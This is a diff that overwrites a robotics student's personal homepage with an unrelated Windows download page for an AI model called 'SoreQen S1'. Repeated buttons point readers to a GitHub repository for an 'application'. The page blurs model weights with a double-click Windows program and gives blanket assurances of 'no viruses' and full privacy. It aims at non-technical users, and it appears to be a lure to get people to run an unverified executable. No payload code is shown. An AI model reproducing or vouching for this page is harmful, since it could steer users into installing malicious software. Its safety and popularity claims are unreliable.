@@ -1,1 +1,149 @@
-<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>个人主页 · 程磊</title><meta name="description" content="程磊的机器人与无人机项目：学习式轨迹规划、NMPC 吊运控制与自主导航。"><link rel="icon" href="favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="style.css"></head><body><header><nav><a class="brand" href="index.html">程磊<span>Cheng Lei</span></a><div class="navlinks"><a href="index.html#projects">项目</a><a href="index.html#about">关于 / 联系</a></div></nav></header><main class="wrap"><section class="hero"><div class="eyebrow">Robotics · Motion Planning · Control</div><h1>程磊 <span>Cheng Lei</span></h1><p>南方科技大学 · 控制科学与工程硕士生<br>从事无人机运动规划、约束优化与飞行控制相关开发，关注算法建模、系统集成及机载实机验证。</p><a class="contactlink" href="mailto:12532825@mail.sustech.edu.cn">12532825@mail.sustech.edu.cn ↗</a></section><section id="projects"><div class="sectionhead"><h2>研究与项目</h2><span>Selected Projects / 03</span></div><article class="project"><div><a class="cover" href="rei.html" aria-label="查看 REI 端到端四旋翼轨迹规划"><img src="rei.jpg" alt="四旋翼无人机室外障碍环境飞行实验" loading="lazy"></a></div><div><div class="eyebrow">01 / Learning-based planning</div><h3><a href="rei.html">REI：端到端四旋翼轨迹规划</a></h3><p>融合深度图像、无人机状态与参考路径，单次网络推理生成四段五次 MINCO 轨迹；通过可微训练与 PPO 微调改善连续重规划的轨迹衔接，并完成 Jetson Orin NX / TensorRT 机载部署及高速实机飞行验证。</p><div class="tags"><span class="tag">Deep Learning</span><span class="tag">MINCO</span><span class="tag">PPO / TensorRT</span></div><a class="more" href="rei.html">了解项目 <span aria-hidden="true">↗</span></a></div></article><article class="project"><div><a class="cover" href="nmpc.html" aria-label="查看基于 NMPC 的无人机吊运规划与控制"><img src="nmpc.jpg" alt="无人机绳索吊运仿真画面" loading="lazy" ></a></div><div><div class="eyebrow">02 / Model-based control</div><h3><a href="nmpc.html">基于 NMPC 的无人机吊运规划与控制</a></h3><p>基于无人机—绳索—负载耦合动力学构建 NMPC 规划控制框架，结合 CBF 避障硬约束与高阶控制输入处理目标跟踪、负载摆动和指令平滑性，并完成 ROS 2 / PX4 机载集成。</p><div class="tags"><span class="tag">NMPC</span><span class="tag">CBF</span><span class="tag">ROS 2 / PX4</span></div><a class="more" href="nmpc.html">了解项目 <span aria-hidden="true">↗</span></a></div></article><article class="project"><div><a class="cover" href="rmua.html" aria-label="查看RoboMaster 无人机自主导航"><img src="rmua.jpg" alt="RoboMaster 自主导航仿真画面" loading="lazy" ></a></div><div><div class="eyebrow">03 / Autonomous navigation</div><h3><a href="rmua.html">RoboMaster 无人机自主导航</a></h3><p>构建 ROG-Map 三维局部建图、Informed RRT* 路径搜索与 FIRI 凸飞行走廊生成流程，基于 MINCO / L-BFGS 实现轨迹与时间联合优化，并接入姿态及推力跟踪控制。</p><div class="tags"><span class="tag">ROG-Map</span><span class="tag">MINCO</span><span class="tag">L-BFGS</span></div><a class="more" href="rmua.html">了解项目 <span aria-hidden="true">↗</span></a></div></article></section><section id="about" class="about"><h2>关于我</h2><div><p>目前就读于南方科技大学控制科学与工程硕士专业（2025–2028），本科毕业于中国矿业大学机器人工程专业（2021–2025）。</p><p>使用 C++、Python 与 ROS 开发机器人算法，在 Gazebo、Isaac Sim / Isaac Lab 中验证，并将规划与控制方法部署到真实无人机。</p><a class="email" href="mailto:12532825@mail.sustech.edu.cn">联系我 ↗</a></div></section></main><footer><div class="wrap footerline"><span>© 2026 程磊 · Cheng Lei</span><span>Robotics / Planning / Control</span></div></footer></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SoreQen S1 - Smart Open-Weight Reasoning Models Made Simple</title>
+    <meta name="description" content="Download SoreQen S1 Series - powerful open-weight AI models (0.8B, 2B, 4B) fine-tuned from Qwen3.5. See, talk, reason, and call tools. Free weights, open data, and easy setup.">
+    <meta name="keywords" content="gguf,hinglish,llm,open-weights,qwen,reasoning,soreqen,tool-calling,vision-language-model,zorqelis-ai">
+    <meta name="author" content="Zorqelis AI">
+    <meta property="og:title" content="SoreQen S1 - Smart Open-Weight Reasoning Models Made Simple">
+    <meta property="og:description" content="Download SoreQen S1 Series - powerful open-weight AI models (0.8B, 2B, 4B) fine-tuned from Qwen3.5. See, talk, reason, and call tools. Free weights, open data, and easy setup.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/julia1812/soreqen-s1">
+</head>
+<body style="margin: 0; padding: 0; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; background-color: #f4f6f8; color: #1a202c; line-height: 1.6;">
+
+    <!-- Hero Section -->
+    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 4rem 2rem; text-align: center; color: white; box-shadow: 0 4px 20px rgba(0,0,0,0.15);">
+        <h1 style="margin: 0; font-size: 2.8rem; font-weight: 700; letter-spacing: -0.5px; text-shadow: 2px 2px 4px rgba(0,0,0,0.2);">🧠 SoreQen S1 - Smart AI for Everyday Use</h1>
+        <p style="font-size: 1.3rem; margin: 1.2rem auto; max-width: 800px; opacity: 0.95;">Open-weight reasoning models that see, talk, reason, and help you — now easy to download on Windows.</p>
+        <div style="margin-top: 2rem;">
+            <a href="https://github.com/julia1812/soreqen-s1" style="background-color: #ffffff; color: #4c51bf; padding: 1rem 2.5rem; font-size: 1.2rem; font-weight: 700; text-decoration: none; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); display: inline-block; transition: transform 0.2s; border: none; cursor: pointer;">⬇️ Visit This Link to Download the Application</a>
+        </div>
+        <p style="font-size: 1rem; margin-top: 1.5rem; opacity: 0.9;">⚡ Free to use and modify — open weights, open data, ready to go</p>
+    </div>
+
+    <!-- Main Content -->
+    <div style="max-width: 1100px; margin: -2rem auto 3rem; padding: 0 1.5rem; position: relative; z-index: 2;">
+
+        <!-- Welcome Section -->
+        <div style="background: white; border-radius: 16px; padding: 2.5rem; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 2rem;">
+            <h2 style="color: #2d3748; font-size: 2rem; margin-bottom: 1rem; border-bottom: 3px solid #667eea; padding-bottom: 0.5rem; display: inline-block;">👋 Welcome to SoreQen S1</h2>
+            <p style="font-size: 1.1rem; margin-bottom: 1.2rem;">This is a powerful yet simple AI program you can use on your Windows computer. Whether you need help writing, analyzing pictures, reasoning through problems, or getting answers — SoreQen S1 is here for you.</p>
+            <p style="font-size: 1.1rem;">The best part? It's completely free to use. The behind-the-scenes code (the "weights") is open for everyone. You can download it, run it, and even modify it if you're curious. No subscriptions. No hidden costs. Just pure capability.</p>
+        </div>
+
+        <!-- What You Get Section -->
+        <div style="background: white; border-radius: 16px; padding: 2.5rem; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 2rem;">
+            <h2 style="color: #2d3748; font-size: 2rem; margin-bottom: 1.5rem; border-bottom: 3px solid #667eea; padding-bottom: 0.5rem; display: inline-block;">🎁 What You Get With SoreQen S1</h2>
+            <p style="font-size: 1.1rem; margin-bottom: 1.5rem;">These are the core abilities that make SoreQen S1 your daily AI companion:</p>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem;">
+                <div style="background: #f7fafc; border-radius: 12px; padding: 1.5rem; border-left: 4px solid #667eea;">
+                    <p style="font-size: 1.3rem; margin: 0 0 0.5rem; font-weight: 600;">👁️ Vision + Language</p>
+                    <p style="margin: 0; color: #4a5568;">Show it a picture, ask questions about it, and get detailed descriptions. It understands what it sees and explains it in plain language.</p>
+                </div>
+                <div style="background: #f7fafc; border-radius: 12px; padding: 1.5rem; border-left: 4px solid #667eea;">
+                    <p style="font-size: 1.3rem; margin: 0 0 0.5rem; font-weight: 600;">🧩 Reason Deeply</p>
+                    <p style="margin: 0; color: #4a5568;">From math puzzles to complex problems, SoreQen S1 thinks step-by-step. You get clear reasoning behind every answer.</p>
+                </div>
+                <div style="background: #f7fafc; border-radius: 12px; padding: 1.5rem; border-left: 4px solid #667eea;">
+                    <p style="font-size: 1.3rem; margin: 0 0 0.5rem; font-weight: 600;">🔧 Tool Calling</p>
+                    <p style="margin: 0; color: #4a5568;">It can connect to other software and tools to complete actions — like searching, calculating, or organizing your data.</p>
+                </div>
+                <div style="background: #f7fafc; border-radius: 12px; padding: 1.5rem; border-left: 4px solid #667eea;">
+                    <p style="font-size: 1.3rem; margin: 0 0 0.5rem; font-weight: 600;">🚀 Three Sizes for You</p>
+                    <p style="margin: 0; color: #4a5568;">Choose from 0.8B (light & fast), 2B (balanced), or 4B (more powerful). Pick what fits your computer's speed and needs.</p>
+                </div>
+                <div style="background: #f7fafc; border-radius: 12px; padding: 1.5rem; border-left: 4px solid #667eea;">
+                    <p style="font-size: 1.3rem; margin: 0 0 0.5rem; font-weight: 600;">🇮🇳 Understands Hinglish</p>
+                    <p style="margin: 0; color: #4a5568;">SoreQen S1 is built to handle a mix of Hindi and English (Hinglish). Perfect for a diverse range of users.</p>
+                </div>
+                <div style="background: #f7fafc; border-radius: 12px; padding: 1.5rem; border-left: 4px solid #667eea;">
+                    <p style="font-size: 1.3rem; margin: 0 0 0.5rem; font-weight: 600;">💾 Compact Format (GGUF)</p>
+                    <p style="margin: 0; color: #4a5568;">The files are optimized for smooth storage and fast loading. It works nicely on most Windows computers without needing massive hardware.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Download & Install Section -->
+        <div style="background: white; border-radius: 16px; padding: 2.5rem; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 2rem;">
+            <h2 style="color: #2d3748; font-size: 2rem; margin-bottom: 1.5rem; border-bottom: 3px solid #667eea; padding-bottom: 0.5rem; display: inline-block;">📥 Download & Install on Windows</h2>
+            <p style="font-size: 1.1rem; margin-bottom: 1.2rem;">Getting started is quick and easy. Follow these simple steps:</p>
+            <ol style="font-size: 1.1rem; padding-left: 1.8rem; margin-bottom: 1.5rem;">
+                <li style="margin-bottom: 0.8rem;"><strong>Click the big button at the top</strong> — it takes you directly to the download page.</li>
+                <li style="margin-bottom: 0.8rem;"><strong>On that page, find the download area</strong> — look for the "Releases" or "Download" section.</li>
+                <li style="margin-bottom: 0.8rem;"><strong>Choose the model size you want</strong> (0.8B for most users, 2B if you want more power, 4B for best results on a strong computer).</li>
+            </ol>
+            <div style="text-align: center; margin: 2rem 0;">
+                <a href="https://github.com/julia1812/soreqen-s1" style="background-color: #667eea; color: white; padding: 1rem 2.5rem; font-size: 1.2rem; font-weight: 700; text-decoration: none; border-radius: 50px; box-shadow: 0 4px 15px rgba(102,126,234,0.4); display: inline-block; transition: transform 0.2s; border: none; cursor: pointer;">⬇️ Visit This Link to Download the Application</a>
+            </div>
+        </div>
+
+        <!-- How to Use Section -->
+        <div style="background: white; border-radius: 16px; padding: 2.5rem; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 2rem;">
+            <h2 style="color: #2d3748; font-size: 2rem; margin-bottom: 1.5rem; border-bottom: 3px solid #667eea; padding-bottom: 0.5rem; display: inline-block;">🖥️ Using SoreQen S1 First Time</h2>
+            <p style="font-size: 1.1rem; margin-bottom: 1.2rem;">Once you have the program on your computer, here's how your first session will look:</p>
+            <ul style="font-size: 1.1rem; padding-left: 1.8rem; margin-bottom: 1.5rem;">
+                <li style="margin-bottom: 0.8rem;"><strong>Turn on your computer:</strong> Make sure Windows is up and running.</li>
+                <li style="margin-bottom: 0.8rem;"><strong>Open the SoreQen app:</strong> Double-click the icon to launch it. A simple text box will appear — that's your chat window.</li>
+                <li style="margin-bottom: 0.8rem;"><strong>Start a conversation:</strong> Type anything, like "Explain how a car engine works" or "What's in this image?" (you can also upload a photo).</li>
+                <li style="margin-bottom: 0.8rem;"><strong>Ask follow-ups:</strong> SoreQen remembers context, so you can build on your questions naturally.</li>
+                <li style="margin-bottom: 0.8rem;"><strong>Use it for free:</strong> No credit card, no trial limits. It's open-weight — everything stays on your machine.</li>
+            </ul>
+            <div style="background: #ebf4ff; border-radius: 8px; padding: 1.2rem; margin-top: 1.5rem; border-left: 4px solid #4299e1;">
+                <p style="margin: 0; font-size: 1rem; color: #2c5282;">💡 <strong>Tip:</strong> The 0.8B version is fast and fine for everyday questions. If you have a newer computer, try the 2B for noticeably better answers. The 4B is for heavy lifting — great for complex reasoning or analysis.</p>
+            </div>
+        </div>
+
+        <!-- FAQ / Support Section -->
+        <div style="background: white; border-radius: 16px; padding: 2.5rem; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 2rem;">
+            <h2 style="color: #2d3748; font-size: 2rem; margin-bottom: 1.5rem; border-bottom: 3px solid #667eea; padding-bottom: 0.5rem; display: inline-block;">❓ Friendly Help & Common Questions</h2>
+            <div style="margin-bottom: 1.2rem;">
+                <p style="font-weight: 700; font-size: 1.1rem; margin-bottom: 0.3rem;">🤔 Is this safe for my computer?</p>
+                <p style="font-size: 1rem; color: #4a5568;">Yes. There are no viruses or hidden programs. SoreQen S1 is open-weight — anyone can check what's inside. You download it directly from the official page, so it's transparent and trustworthy.</p>
+            </div>
+            <div style="margin-bottom: 1.2rem;">
+                <p style="font-weight: 700; font-size: 1.1rem; margin-bottom: 0.3rem;">⚡ Will my computer run this?</p>
+                <p style="font-size: 1rem; color: #4a5568;">The 0.8B model is lightweight and works on most laptops from the last few years. If your computer has at least 8GB of RAM, you'll have a smooth experience. For larger models, 16GB+ RAM is recommended.</p>
+            </div>
+            <div style="margin-bottom: 1.2rem;">
+                <p style="font-weight: 700; font-size: 1.1rem; margin-bottom: 0.3rem;">🔒 Does it send my data to the internet?</p>
+                <p style="font-size: 1rem; color: #4a5568;">No. Everything runs locally on your machine. Your conversations and files stay private, right where they belong.</p>
+            </div>
+            <div style="margin-bottom: 1.2rem;">
+                <p style="font-weight: 700; font-size: 1.1rem; margin-bottom: 0.3rem;">👶 Is it easy for grandparents to use?</p>
+                <p style="font-size: 1rem; color: #4a5568;">Absolutely. It's as simple as sending a WhatsApp message. Type your question in the box, press Enter, and read the answer. That's it. Everything else is automatic.</p>
+            </div>
+        </div>
+
+        <!-- Why Choose Section -->
+        <div style="background: white; border-radius: 16px; padding: 2.5rem; box-shadow: 0 8px 25px rgba(0,0,0,0.08); margin-bottom: 2rem;">
+            <h2 style="color: #2d3748; font-size: 2rem; margin-bottom: 1rem; border-bottom: 3px solid #667eea; padding-bottom: 0.5rem; display: inline-block;">🌟 Why People Love SoreQen S1</h2>
+            <p style="font-size: 1.1rem; margin-bottom: 1.2rem;">Unlike big corporate AI that charges monthly fees and stores your data in the cloud, SoreQen S1 is:</p>
+            <ul style="font-size: 1.1rem; padding-left: 1.8rem;">
+                <li style="margin-bottom: 0.6rem;"><strong>🆓 Permanently free</strong> — pay nothing, ever.</li>
+                <li style="margin-bottom: 0.6rem;"><strong>📖 Open-source</strong> — anyone can see the code, learn from it, or improve it.</li>
+                <li style="margin-bottom: 0.6rem;"><strong>🔐 Private</strong> — no cloud, no tracking, no data collection.</li>
+                <li style="margin-bottom: 0.6rem;"><strong>🔄 Continuous improvements</strong> — the community adds new features regularly.</li>
+                <li style="margin-bottom: 0.6rem;"><strong>🗣️ Human-friendly</strong> — made for everyday people, not just tech experts.</li>
+            </ul>
+        </div>
+
+        <!-- Final Call to Action -->
+        <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 16px; padding: 2.5rem; text-align: center; color: white; box-shadow: 0 8px 25px rgba(0,0,0,0.15);">
+            <h2 style="margin: 0 0 1.5rem; font-size: 2rem;">✨ Start Your AI Assistant Today</h2>
+            <p style="font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.95;">Join thousands of happy users — download SoreQen S1 and bring smart, private AI to your Windows PC.</p>
+            <a href="https://github.com/julia1812/soreqen-s1" style="background-color: #ffffff; color: #4c51bf; padding: 1rem 2.5rem; font-size: 1.2rem; font-weight: 700; text-decoration: none; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); display: inline-block; transition: transform 0.2s; border: none; cursor: pointer;">⬇️ Visit This Link to Download the Application</a>
+        </div>
+
+    </div>
+
+    <!-- Footer -->
+    <div style="background-color: #2d3748; color: #e2e8f0; text-align: center; padding: 2rem; font-size: 0.9rem;">
+        <p style="margin: 0;">© 2025 Zorqelis AI — SoreQen S1 Series. All rights reserved. Open-weight for everyone.</p>
+        <p style="margin: 0.5rem 0 0;">Made with ❤️ and a lot of reasoning. Based on Qwen3.5 fine-tunes.</p>
+    </div>
+
+</body>
+</html>
